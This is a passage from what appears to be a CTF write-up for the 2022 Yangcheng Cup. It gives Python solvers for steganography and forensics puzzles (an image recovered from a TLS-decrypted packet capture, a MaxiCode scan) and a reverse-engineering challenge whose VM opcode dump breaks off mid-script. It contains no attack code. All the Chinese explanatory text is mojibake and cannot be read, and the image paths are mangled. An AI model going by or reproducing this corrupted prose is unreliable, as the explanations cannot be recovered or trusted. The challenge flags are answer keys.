<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file=<span class="string">&#x27;D:\\æ¡Œé¢\\829962.txt&#x27;</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span> = string.ascii_letters+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;1&#x27;</span>+<span class="string">&#x27;3&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span></span><br><span class="line">var = <span class="string">&#x27;&#x27;</span></span><br><span class="line">f = <span class="built_in">open</span>(file,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;gbk&#x27;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">        var += i</span><br><span class="line"><span class="built_in">print</span>(var)</span><br></pre></td></tr></table></figure>
<p>è·å¾—ä¸²flag</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/15.png" alt="15"></p>
<p>ç»“åˆç‰¹å¾</p>
<p>flag{h1d3_1n_th3_p1ctur3}</p>
<h3 id="è¿·å¤±å¹»å¢ƒ"><a class="markdownIt-Anchor" href="#è¿·å¤±å¹»å¢ƒ"></a> è¿·å¤±å¹»å¢ƒ</h3>
<p>æ‰“å¡å‹ç¼©åŒ…ï¼Œæ˜¯è™šæ‹Ÿç£ç›˜é•œåƒï¼Œå–è¯å¤§å¸ˆæŒ‚è½½ï¼ŒæŸ¥çœ‹å›æ”¶ç«™æœ‰ä¸€ä¸ªjpgå’Œä¸€ä¸ª45æ–‡ä»¶ã€‚</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/TWe1v3%27s%20blog/Hexo/blog/source/_posts/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup.assets/16.png" alt="16"></p>
<p>æŸ¥çœ‹45æ–‡ä»¶å‘ç°PNGæ ¼å¼ç‰¹å¾</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/TWe1v3%27s%20blog/Hexo/blog/source/_posts/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup.assets/17.png" alt="17"></p>
<p>è¡¥å……æ–‡ä»¶å¤´ï¼Œç„¶åä¸ç»™çš„100å¼ å›¾ç‰‡ä¸­éšä¾¿é€‰ä¸€å¼ ç”¨stegsloveé‡Œçš„Image combinerï¼Œè·å¾—ä¸€çªœå­—ç¬¦â€œKey is å¯è‰å‰æ¥æŠ¥åˆ°â€ï¼ŒçŒœæµ‹å¯çˆ±å¯è‰.jpgå°±æ˜¯åŠ å¯†çš„å›¾ç‰‡ï¼Œè½®ç•ªè¯•è¿‡ä¹‹åï¼Œç”¨outguessè§£å‡ºflag</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/18.png" alt="18"></p>
<p>DASCTF{f473a6fd2de17a0c5794414b3905ebbe}</p>
<h3 id="èº²çŒ«çŒ«"><a class="markdownIt-Anchor" href="#èº²çŒ«çŒ«"></a> èº²çŒ«çŒ«</h3>
<p>æ‰“å¼€é¢˜ç›®é™„ä»¶ï¼Œç”¨wiresharkæ‰“å¼€ï¼Œè¯»å–httpæŠ¥æ–‡ï¼Œå‘ç°ä¸€ä¸ªPNGç‰¹å¾æ ¼å¼çš„æ–‡ä»¶</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/19.png" alt="img"></p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/20.png" alt="img"></p>
<p>ä¸‹è½½è·å¾—ä¸€å¼ ç°è‰²çš„PNG</p>
<p>æ¥ç€è¯»æŠ¥æ–‡ï¼ŒFTPæ‹¿åˆ°ä¸€ä¸ªåŠ å¯†å‹ç¼©åŒ…ï¼Œå‘ç°key.logæ²¡æœ‰åŠ å¯†ï¼ŒæŸ¥çœ‹å†…å®¹ï¼Œé€šè¿‡æŸ¥è¯¢æ˜¯ç”¨æ¥è§£å¯†TLSæµé‡çš„ã€‚</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/21.png" alt="img"></p>
<p>è§£å¯†TLSæµé‡ä¹‹åè·å¾—ä¸€å¼ JPGå›¾ç‰‡</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/22.png" alt="img"></p>
<p>å†…å®¹æ˜¯å‹ç¼©åŒ…çš„è§£å‹å¯†ç ã€‚è§£å‹åçš„è„šæœ¬æ˜¯å¯¹åŸå›¾çš„åƒç´ é‡è®¡ç®—ï¼Œç¼–å†™è„šæœ¬æ¢å¤åŸå›¾ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> numpy <span class="keyword">import</span> array, zeros, uint8</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">image = cv2.imread(<span class="string">&quot;hide.png&quot;</span>)</span><br><span class="line">imagearray = array(image)</span><br><span class="line"> </span><br><span class="line">x,y = <span class="number">5999540678407978169965856946811257903979429787575580150595711549672916183293763090704344230372835328</span>,<span class="number">6310149030391323406342737832910952782997118359318834776480172449836047279615976753524231989362688</span></span><br><span class="line"> </span><br><span class="line">h,w = <span class="number">1800</span>,<span class="number">1800</span></span><br><span class="line"> </span><br><span class="line">x1 = <span class="built_in">round</span>(x/y*<span class="number">0.001</span>, <span class="number">16</span>)</span><br><span class="line">u1 = y*<span class="number">3650</span>/x</span><br><span class="line">x2 = <span class="built_in">round</span>(x/y*<span class="number">0.00101</span>, <span class="number">16</span>)</span><br><span class="line">u2 = y*<span class="number">3675</span>/x</span><br><span class="line">x3 = <span class="built_in">round</span>(x/y*<span class="number">0.00102</span>, <span class="number">16</span>)</span><br><span class="line">u3 = y*<span class="number">3680</span>/x</span><br><span class="line">kt = [x1, x2, x3]</span><br><span class="line">temp_image = zeros(shape=[h, w, <span class="number">3</span>], dtype=uint8)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, h):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, w):</span><br><span class="line">            x1 = u1 * x1 * (<span class="number">1</span> - x1)</span><br><span class="line">            x2 = u2 * x2 * (<span class="number">1</span> - x2)</span><br><span class="line">            x3 = u3 * x3 * (<span class="number">1</span> - x3)</span><br><span class="line">            r1 = <span class="built_in">int</span>(x1*<span class="number">255</span>)</span><br><span class="line">            r2 = <span class="built_in">int</span>(x2*<span class="number">255</span>)</span><br><span class="line">            r3 = <span class="built_in">int</span>(x3*<span class="number">255</span>)</span><br><span class="line">            <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">3</span>):</span><br><span class="line">                temp_image[i][j][t] = (imagearray[i][j][t] - ((r1+r2) ^ r3)) % <span class="number">256</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    x1 = kt[<span class="number">0</span>]</span><br><span class="line">    x2 = kt[<span class="number">1</span>]</span><br><span class="line">    x3 = kt[<span class="number">2</span>]</span><br><span class="line"> </span><br><span class="line">encflagarray = Image.fromarray(temp_image)</span><br><span class="line">encflagarray.show()</span><br><span class="line">encflagarray.save(<span class="string">&quot;flag.png&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œä¸€ç•ªæœç´¢ï¼Œæ˜¯Maxicodeç ï¼Œæ‰«æå¤šæ¬¡æœªæˆåŠŸï¼Œæ¥ç€æŸ¥æ‰¾èµ„æ–™ï¼Œå‘ç°çŒ«çš„ä½ç½®éœ€è¦æ›´æ›¿ä¸ºä¸€ä¸ªä¸­å¿ƒé¶æ ‡ï¼ˆå…¬ç‰›çœ¼ï¼‰</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/23.png" alt="img"></p>
<p>æ‰«ææˆåŠŸï¼ï¼</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/24.png" alt="img"></p>
<p>GWHT{ozqgVLoI1DvK8giNVdvGslr_aZKKwNuv_q-FzqB5N3hHHqn3}</p>
<h2 id="re"><a class="markdownIt-Anchor" href="#re"></a> Re</h2>
<h3 id="bbbbutton"><a class="markdownIt-Anchor" href="#bbbbutton"></a> BBBButton</h3>
<p>è¾“å…¥åˆ†ä¸ºä¸¤æ®µï¼Œå…¶ä¸­ç¬¬äºŒæ®µæ˜¯æœ€åçš„flagã€‚å› ä¸ºåªæœ‰4ä¸ªæŒ‰é’®ï¼ŒçŒœæµ‹ä¸å››è¿›åˆ¶æœ‰å…³ï¼Œä¹‹ååœ¨åŠ¨è°ƒçš„è¿‡ç¨‹ä¸­ä¹Ÿåˆšå¥½å‘ç°äº†å››è¿›åˆ¶è½¬æ¢åçš„æ•°å­—ã€‚</p>
<h4 id="check1"><a class="markdownIt-Anchor" href="#check1"></a> <strong>check1</strong></h4>
<p>åŠ¨è°ƒå‘ç°ï¼Œcheck1æ˜¯ä»ä¸€å¼ è¡¨ä¸­å¾—åˆ°&quot;-bl^H&quot;å­—ç¬¦ä¸²ï¼Œæœ¬è´¨ä¸Šæ˜¯é€šè¿‡æ•´é™¤åŠå–ä½™çš„æ–¹å¼ç¡®å®šä¸‹æ ‡å¾—åˆ°å­—ç¬¦ã€‚è„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> table <span class="keyword">import</span> table        <span class="comment"># å¯¼å…¥è¡¨</span></span><br><span class="line"></span><br><span class="line">c = [<span class="number">0x2d</span>,<span class="number">0x62</span>,<span class="number">0x6c</span>,<span class="number">0x5e</span>,<span class="number">0x48</span>]</span><br><span class="line">a1 = [<span class="number">0x2d</span>,<span class="number">0x62</span>]    <span class="comment"># 14772//4</span></span><br><span class="line">a2 = [<span class="number">0x6c</span>,<span class="number">0x5e</span>]    <span class="comment"># 24740//4</span></span><br><span class="line">a3 = <span class="number">0x48</span></span><br><span class="line"><span class="comment"># 4,344,684,1024,1364,1704,2044,2384,2724,3064,3404,3744,4084,4424,4764,5104,5444,5784,6124,6464,6804,7144,7484,7824,8164,8504,8844,9184,9524,9864,10204,10544,10884,11224,11564,11904,12244,12584,12924,13264,13604,13944,14284,14624,14964,15304,15644,15984,16324,16664,17004,17344,17684,18024,18364,18704,19044,19384,19724,20064,20404,20744,21084,21424,21764,22104,22444,22784,23124,23464,23804,24144,24484,24824,25164,25504,25844,26184,26524,26864,27204,27544,27884,28224,28564</span></span><br><span class="line">tt = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(table),<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">if</span> table[i]==a3:</span><br><span class="line">        tt.append(i//<span class="number">4</span>)</span><br><span class="line">        <span class="comment"># print(i,end=&#x27;,&#x27;)</span></span><br><span class="line">    <span class="keyword">if</span> table[i+<span class="number">1</span>]==a1[<span class="number">0</span>] <span class="keyword">and</span> table[i]==a1[<span class="number">1</span>]:</span><br><span class="line">        n = i//<span class="number">4</span></span><br><span class="line">        <span class="comment"># print(&#x27;1:&#x27;,i)</span></span><br><span class="line">    <span class="keyword">if</span> table[i+<span class="number">1</span>]==a2[<span class="number">0</span>] <span class="keyword">and</span> table[i]==a2[<span class="number">1</span>]:</span><br><span class="line">        m = i//<span class="number">4</span></span><br><span class="line">        <span class="comment"># print(&#x27;2:&#x27;,i)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">k = n*<span class="number">0x1c39</span>+m</span><br><span class="line"><span class="comment"># k = 0x1973a6e</span></span><br><span class="line"><span class="comment"># print(hex(k))</span></span><br><span class="line"></span><br><span class="line">m = k%<span class="number">0x1c39</span></span><br><span class="line">b = k//<span class="number">0x1c39</span></span><br><span class="line"><span class="comment"># print(hex(m))</span></span><br><span class="line"><span class="comment"># print(hex(table[4*m]),hex(table[4*m+1]),hex(table[4*m+2]),hex(table[4*m+3]))</span></span><br><span class="line"><span class="comment"># print(chr(table[4*m+1]),chr(table[4*m]))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tt:</span><br><span class="line">    a = i+<span class="number">85</span>*k</span><br><span class="line">    <span class="comment"># b,c = aaa(a,0x55)</span></span><br><span class="line">    c = a//<span class="number">0x55</span></span><br><span class="line">    <span class="keyword">if</span> c==k:</span><br><span class="line">        flag1 = a</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(a))</span><br><span class="line"><span class="comment"># 0x87366687</span></span><br></pre></td></tr></table></figure>
<p>å°†è§£å‡ºçš„aè½¬åŒ–ä¸º4è¿›åˆ¶è¾“å…¥å³å¯ï¼ˆåŠ¨è°ƒæŒ‰æŒ‰é’®çœŸçš„é­”é¬¼ï¼Œä¸å°å¿ƒæŒ‰é”™è¿˜å¾—é‡å¤´å†æ¥ï¼‰</p>
<h4 id="check2"><a class="markdownIt-Anchor" href="#check2"></a> <strong>check2</strong></h4>
<p>vmæ··æ·†ï¼Œopcodeåˆ©ç”¨check1åŠ å¯†è¿‡ï¼ŒåŠ¨è°ƒç›´æ¥dumpå³å¯ã€‚ç„¶åå°±æ˜¯å–œé—»ä¹è§çš„æ‰‹æ’•ç¯èŠ‚ï¼ˆæ‚²</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode = [<span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0xF4</span>, <span class="number">0x08</span>, </span><br><span class="line">  <span class="number">0x08</span>, <span class="number">0xE1</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x01</span>, <span class="number">0xF6</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, <span class="number">0x0A</span>, <span class="number">0xE1</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xE2</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF2</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x19</span>, <span class="number">0xF4</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0xE2</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0x04</span>, <span class="number">0x06</span>, <span class="number">0xF4</span>, <span class="number">0xF3</span>, <span class="number">0xF2</span>, <span class="number">0xF1</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0x40</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x03</span>, <span class="number">0x05</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0xF6</span>, </span><br><span class="line">  <span class="number">0xF4</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0xE1</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x07</span>, <span class="number">0x06</span>, <span class="number">0xF5</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0xFA</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0xFD</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x05</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xF6</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0x02</span>, <span class="number">0x09</span>, <span class="number">0xE1</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, </span><br><span class="line">  <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x05</span>, <span class="number">0xFA</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0xF9</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0xFB</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>, <span class="number">0xFA</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x0C</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, <span class="number">0xF9</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0xFB</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0xF5</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x07</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0xFB</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>, <span class="number">0xFD</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0xFB</span>, <span class="number">0xF3</span>, <span class="number">0x0B</span>, <span class="number">0x0B</span>, <span class="number">0xF1</span>, <span class="number">0xF2</span>, <span class="number">0xF3</span>, <span class="number">0xF4</span>, <span class="number">0xF5</span>, <span class="number">0xF6</span>, </span><br><span class="line">  <span class="number">0xF7</span>, <span class="number">0xF8</span>, <span class="number">0xF9</span>, <span class="number">0xFA</span>, <span class="number">0xFB</span>, <span class="number">0xFC</span>, <span class="number">0xFD</span>, <span class="number">0xFE</span>, <span class="number">0xFF</span>, <span class="number">0xF0</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>, <span class="number">0xFB</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x0B</span>, <span class="number">0xF5</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0xFB</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0xE1</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0xE2</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x03</span>, <span class="number">0x09</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF2</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x7C</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0xF4</span>, <span class="number">0x02</span>, <span class="number">0x02</span>, <span class="number">0xE1</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x05</span>, <span class="number">0xFA</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0xF9</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0xFB</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x02</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, </span><br><span class="line">  <span class="number">0x03</span>, <span class="number">0xFA</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0C</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0C</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0xF9</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0xFB</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, </span><br><span class="line">  <span class="number">0xF5</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x07</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0xFB</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>, <span class="number">0xFD</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x01</span>, <span class="number">0xFB</span>, <span class="number">0xF3</span>, <span class="number">0x0B</span>, <span class="number">0x0B</span>, <span class="number">0xF1</span>, <span class="number">0xF2</span>, <span class="number">0xF3</span>, </span><br><span class="line">  <span class="number">0xF4</span>, <span class="number">0xF5</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF8</span>, <span class="number">0xF9</span>, <span class="number">0xFA</span>, <span class="number">0xFB</span>, <span class="number">0xFC</span>, <span class="number">0xFD</span>, </span><br><span class="line">  <span class="number">0xFE</span>, <span class="number">0xFF</span>, <span class="number">0xF0</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x03</span>, <span class="number">0xFB</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x09</span>, <span class="number">0x0B</span>, <span class="number">0xF5</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0xFB</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xE1</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xE2</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x03</span>, <span class="number">0x09</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0xF6</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0x01</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0xF2</span>, <span class="number">0x04</span>, <span class="number">0x0C</span>, <span class="number">0x01</span>, <span class="number">0x54</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, <span class="number">0xF1</span>, <span class="number">0x04</span>, <span class="number">0x0A</span>, </span><br><span class="line">  <span class="number">0xF8</span>, <span class="number">0xF7</span>, <span class="number">0xF6</span>, <span class="number">0xF5</span>, <span class="number">0xF4</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0xE1</span>, <span class="number">0xFF</span>, <span class="number">0xE0</span>, </span><br><span class="line">  <span class="number">0x0B</span>, <span class="number">0x0A</span>, <span class="number">0xFB</span>, <span class="number">0xF4</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0xE2</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF2</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0xB2</span>, <span class="number">0xF1</span>, <span class="number">0x01</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x09</span>, <span class="number">0x05</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0xF8</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0xE1</span>, <span class="number">0xF1</span>, <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x05</span>, <span class="number">0xFF</span>, </span><br><span class="line">  <span class="number">0xE0</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x0B</span>, <span class="number">0x01</span>, <span class="number">0xF6</span>, <span class="number">0xF4</span>, </span><br><span class="line">  <span class="number">0x0C</span>, <span class="number">0x0B</span>, <span class="number">0xE1</span>, <span class="number">0xF4</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0xE2</span>, <span class="number">0xF4</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, </span><br><span class="line">  <span class="number">0xE2</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xF2</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0xD7</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = [<span class="number">0</span>]*<span class="number">17</span></span><br><span class="line">mem = [<span class="number">0x123</span>,<span class="number">0x234</span>,<span class="number">0x345</span>,<span class="number">0x456</span>]</span><br><span class="line"><span class="comment"># print(r)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    v4 = r[<span class="number">16</span>]</span><br><span class="line">    r[<span class="number">16</span>] = v4+<span class="number">1</span></span><br><span class="line">    result = opcode[v4]-<span class="number">0xF1</span></span><br><span class="line">    <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">        v1 = r[<span 